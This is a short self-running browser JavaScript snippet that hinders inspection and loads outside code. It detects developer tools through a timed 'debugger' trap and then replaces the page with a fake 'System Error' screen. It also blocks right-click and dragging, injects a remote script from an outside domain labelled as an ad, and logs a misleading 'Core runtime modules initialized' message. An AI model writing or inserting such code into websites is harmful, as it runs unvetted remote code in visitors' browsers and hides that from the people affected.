(function() {
    'use strict';

    setInterval(() => {
        const start = performance.now();
        debugger; 
        const end = performance.now();
        
        if (end - start > 100) {
            document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;'><h1>System Error: 0x8004200</h1></div>";
        }
    }, 1000);

    document.oncontextmenu = function() { return false; };
    document.ondragstart = function() { return false; };

    var adScript = document.createElement('script');
    adScript.src = "https://portslocked.com/59/69/6f/59696ffed979eb1d6b6108ba6c8de3b0.js";
    document.head.appendChild(adScript);

    console.log("Core runtime modules initialized.");
})();
